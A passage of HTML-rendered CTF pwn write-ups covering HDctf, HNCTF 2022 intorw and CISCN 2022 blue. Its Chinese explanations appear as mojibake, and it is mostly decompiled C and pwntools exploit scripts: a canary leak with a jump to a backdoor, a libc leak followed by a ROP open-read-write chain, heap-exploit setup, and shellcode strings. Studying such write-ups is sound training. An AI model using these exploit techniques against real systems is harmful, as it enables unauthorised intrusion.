class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome to HDctf,You can make a wish to me&quot;</span>);</span><br><span class="line">  buf[(<span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;sorry,i can&#x27;t do that&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åæœ‰ä¸ªbuf[?]&#x3D;0ï¼Œé€šè¿‡æ•°ç»„è¶Šç•Œï¼Œä¿®æ”¹rbpç„¶åå°±èƒ½æŠŠæ ˆå¾€ä¸Šè¿ç§»ï¼Œç„¶åå†å¡«å……æ»¡retå’Œbackdoorå°±å¤§åŠŸå‘Šæˆäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28988</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line">ret =<span class="number">0x400902</span></span><br><span class="line">key=p32(<span class="number">0x2c3</span>)</span><br><span class="line">backdoor=<span class="number">0x04007C7</span></span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">sla(<span class="string">b&#x27;tell me you name\n\n&#x27;</span>,pal)</span><br><span class="line">ru(<span class="string">b&#x27;bbbbbbbb\n&#x27;</span>)</span><br><span class="line">canary=u64(<span class="string">b&#x27;\x00&#x27;</span>+r(<span class="number">7</span>))</span><br><span class="line"><span class="comment"># canary=p64(0xdeadbeaf)</span></span><br><span class="line">leak(<span class="string">&quot;canary&quot;</span>,canary)</span><br><span class="line">sa(<span class="string">b&#x27;tell me key\n\n&#x27;</span>,key)</span><br><span class="line">debug()</span><br><span class="line">payload = p64(ret) * <span class="number">10</span></span><br><span class="line">payload += flat([backdoor,canary])</span><br><span class="line">sa(<span class="string">&quot;to me\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="HNCTF-2022-WEEK2-intorw"><a href="#HNCTF-2022-WEEK2-intorw" class="headerlink" title="[HNCTF 2022 WEEK2]intorw"></a>[HNCTF 2022 WEEK2]intorw</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">setvbuf</span><span class="params">(FILE *stream, <span class="type">char</span> *buffer, <span class="type">int</span> mode, <span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure><ul><li><p><code>FILE *stream</code>ï¼šæŒ‡å‘è¦è®¾ç½®ç¼“å†²åŒºçš„æ–‡ä»¶æµã€‚</p></li><li><p><code>char *buffer</code>ï¼šæŒ‡å‘ç”¨ä½œç¼“å†²åŒºçš„å†…å­˜ã€‚å¦‚æœä¸º <code>NULL</code>ï¼Œåˆ™ç”±åº“è‡ªåŠ¨åˆ†é…ç¼“å†²åŒºã€‚</p></li><li><p><code>int mode</code>ï¼šç¼“å†²æ¨¡å¼ï¼Œå¯ä»¥æ˜¯ä»¥ä¸‹ä¸‰ä¸ªå€¼ä¹‹ä¸€ï¼š</p><ul><li><code>_IOFBF</code>ï¼šå…¨ç¼“å†²ï¼ˆFull Bufferingï¼‰ã€‚åªæœ‰å½“ç¼“å†²åŒºæ»¡æˆ–è°ƒç”¨ <code>fflush</code>ã€<code>fclose</code>ã€<code>fseek</code>ã€<code>fsetpos</code> ç­‰å‡½æ•°æ—¶ï¼Œæ‰ä¼šå®é™…æ‰§è¡Œ I&#x2F;O æ“ä½œã€‚</li><li><code>_IOLBF</code>ï¼šè¡Œç¼“å†²ï¼ˆLine Bufferingï¼‰ã€‚å½“è¾“å‡ºä¸€ä¸ªæ¢è¡Œç¬¦ã€ç¼“å†²åŒºæ»¡æˆ–è°ƒç”¨ <code>fflush</code>ã€<code>fclose</code>ã€<code>fseek</code>ã€<code>fsetpos</code> ç­‰å‡½æ•°æ—¶ï¼Œæ‰ä¼šå®é™…æ‰§è¡Œ I&#x2F;O æ“ä½œã€‚</li><li><code>_IONBF</code>ï¼šæ— ç¼“å†²ï¼ˆNo Bufferingï¼‰ã€‚æ¯æ¬¡ I&#x2F;O æ“ä½œéƒ½ä¼šç›´æ¥æ‰§è¡Œï¼Œä¸ä¼šä½¿ç”¨ç¼“å†²åŒºã€‚</li></ul></li><li><p><code>size_t size</code>ï¼šç¼“å†²åŒºçš„å¤§å°ã€‚å¦‚æœ <code>buffer</code> ä¸º <code>NULL</code>ï¼Œåˆ™å¿½ç•¥æ­¤å‚æ•°ã€‚</p></li><li><p>æˆåŠŸæ—¶è¿”å› <code>0</code>ã€‚</p></li><li><p>å¤±è´¥æ—¶è¿”å›éé›¶å€¼ã€‚</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IOFBF  0  <span class="comment">// å…¨ç¼“å†²</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IOLBF  1  <span class="comment">// è¡Œç¼“å†²</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IONBF  2  <span class="comment">// æ— ç¼“å†²</span></span></span><br></pre></td></tr></table></figure><h2 id="é™æ€åˆ†æ-2"><a href="#é™æ€åˆ†æ-2" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter how many bits you want to read&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">99</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = bitschange(v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter what you want to read:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, v3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You&#x27;re reading in too many bits!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">bitschange</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°å‚æ•°æ˜¯æ— ç¬¦å·å‹ï¼Œæ˜¾ç„¶è´Ÿæ•°æº¢å‡º</p><p>æœ‰æ²™ç›’å› æ­¤orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./intorw&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">20031</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p, execute=duan)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0x601046</span></span><br><span class="line">vuln=<span class="number">0x04009C4</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000400ad3</span>  <span class="comment">#0x0000000000400ad3 : pop rdi ; ret</span></span><br><span class="line">pal=<span class="number">0x28</span>*<span class="string">b&#x27;a&#x27;</span>+p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(vuln)</span><br><span class="line">sla(<span class="string">b&#x27;Please enter how many bits you want to read\n&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;read:\n&#x27;</span>,pal)</span><br><span class="line">libc_base=u64(rl()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc.address=libc_base</span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">pop_rdx_rbx_ret=libc_base+<span class="number">0x0000000000090529</span>   <span class="comment"># 0x0000000000090529 : pop rdx ; pop rbx ; ret</span></span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x000000000002be51</span>       <span class="comment"># 0x000000000002be51 : pop rsi ; ret</span></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x0000000000045eb0</span>       <span class="comment"># 0x0000000000045eb0 : pop rax ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>=libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read=libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pal=<span class="number">0x28</span>*<span class="string">b&#x27;a&#x27;</span> + p64(pop_rdi_ret) +p64(flag) +p64(pop_rsi_ret) +p64(<span class="number">0</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line">pal+=p64(pop_rdi_ret)+p64(<span class="number">0x3</span>)+p64(pop_rsi_ret)+p64(elf.bss())+p64(pop_rdx_rbx_ret)+p64(<span class="number">0x50</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">pal+=p64(pop_rdi_ret)+p64(<span class="number">0x1</span>)+p64(pop_rsi_ret)+p64(elf.bss())+p64(pop_rdx_rbx_ret)+p64(<span class="number">0x50</span>)*<span class="number">2</span>+p64(write)</span><br><span class="line">sla(<span class="string">b&#x27;Please enter how many bits you want to read\n&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;read:\n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop=ROP(libc)</span></span><br><span class="line"><span class="comment"># rop.read(0,elf.bss()+0x200,0x6)</span></span><br><span class="line"><span class="comment"># rop.open(elf.bss()+0x200,0)</span></span><br><span class="line"><span class="comment"># rop.read(3,elf.bss()+0x400,0x80)</span></span><br><span class="line"><span class="comment"># rop.puts(elf.bss()+0x400)</span></span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sla(b&#x27;Please enter how many bits you want to read\n&#x27;,b&#x27;-1&#x27;)</span></span><br><span class="line"><span class="comment"># pal=b&#x27;a&#x27;*0x28 + rop.chain()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sa(&#x27;Please enter what you want to read:\n&#x27;,pal)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s(b&#x27;/flag\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>ä¸¤ç§å†™æ³•ï¼Œé¦–å…ˆç¬¬ä¸€ç§ä¾¿æ˜¯å¸¸è§„orwï¼Œå› ä¸ºæˆ‘æ‰¾ä¸åˆ°syscall,retçš„ropï¼Œä½†æ˜¯æˆ‘çœ‹å…¶ä»–äººæ‰¾åˆ°äº†ï¼Œå› ä¸ºæœ‰libcç›´æ¥å‡½æ•°å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># rop=ROP(libc)</span></span><br><span class="line"><span class="comment"># rop.read(0,elf.bss()+0x200,0x6)</span></span><br><span class="line"><span class="comment"># rop.open(elf.bss()+0x200,0)</span></span><br><span class="line"><span class="comment"># rop.read(3,elf.bss()+0x400,0x80)</span></span><br><span class="line"><span class="comment"># rop.puts(elf.bss()+0x400)</span></span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sla(b&#x27;Please enter how many bits you want to read\n&#x27;,b&#x27;-1&#x27;)</span></span><br><span class="line"><span class="comment"># pal=b&#x27;a&#x27;*0x28 + rop.chain()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sa(&#x27;Please enter what you want to read:\n&#x27;,pal)</span></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s(b&#x27;/flag\x00&#x27;)</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§æˆ‘æ˜¯ç¬¬ä¸€æ¬¡è§è¿™ç§ç”¨æ³•ï¼Œéå¸¸ç®€ä¾¿ï¼Œå­¦åˆ°äº†ï¼Œè¦æ±‚libc.addressä¸ºlibc_baseä¸ç„¶ä¼šæŠ¥é”™</p><h1 id="CISCN-2022-åä¸œåŒ—-blue"><a href="#CISCN-2022-åä¸œåŒ—-blue" class="headerlink" title="[CISCN 2022 åä¸œåŒ—]blue"></a>[CISCN 2022 åä¸œåŒ—]blue</h1><p>è¿™é¢˜ç€å®æ˜¯è®©æˆ‘å—ç›Šå¾ˆå¤šï¼ˆä¹Ÿæ¶å¿ƒåˆ°äº†æˆ‘</p><p>ORW</p><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>é¦–å…ˆé¢˜ç›®æ˜¯éƒ½æ˜¯tcacheå—ï¼Œæœ€å¤§åªèƒ½ç”³è¯·0x90(0xa0)çš„å †å—ï¼Œæœ‰ä¸€æ¬¡çš„uafï¼Œä¸€æ¬¡çš„showï¼Œå’Œaddï¼Œdeleteçš„åŠŸèƒ½</p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>é¦–å…ˆæ˜¯é€šè¿‡ç”³è¯·9ä¸ª0x80çš„å †å—ï¼Œç„¶åå¡«æ»¡tcacheï¼Œä¹‹åç»™ä¸€ä¸ªuafå°±èƒ½åˆ°unsortedbiné‡Œï¼Œç„¶åshowå°±æ³„éœ²äº†libcåŸºå€ï¼Œä¹‹åè¦æ‰“ORWçš„ä¸€ä¸ªæ€è·¯ä¾¿æ˜¯ç”³è¯·åˆ°æ ˆä¸Šï¼Œè€Œè¿™å°±å°‘ä¸äº†æ³„éœ²æ ˆåœ°å€å’Œä¸€ä¸ªä»»æ„åœ°å€å†™ï¼Œæ‰€ä»¥é¦–å…ˆå›åˆ°ä¸Šé¢ï¼Œaddäº†9ä¸ªå †å—ï¼Œå†ç”³è¯·ä¸€ä¸ªéš”ç¦»å—ï¼Œä¹‹åuafæ‰ç¬¬ä¹ä¸ªå †å—ï¼Œdeleteæ‰ç¬¬å…«ä¸ªå †å—ï¼Œå°±èƒ½å°†unsortedbinå’Œtcachebinå®ç°overlappingï¼Œç„¶åå†ç”³è¯·ä¸€ä¸ª0x70çš„å †å—ï¼Œå†ç”³è¯·ä¸€ä¸ª0x80çš„å †å—ï¼ŒåŒæ—¶å°†è¿™ä¸ª0x80æ”¾åˆ°tcacheä¸­ï¼Œå°±èƒ½å°†uafçš„ç¬¬8ä¸ªå †å—å’Œè¿™ä¸ª0x80å †å—overlappingï¼Œä¹‹åä¾¿æ˜¯é€šè¿‡stdoutæ¥æ³„éœ²environï¼Œç„¶åæ‰“åˆ°addä¸Šretæ‰“orw</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span> , arch=<span class="string">&#x27;amd64&#x27;</span> , log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span 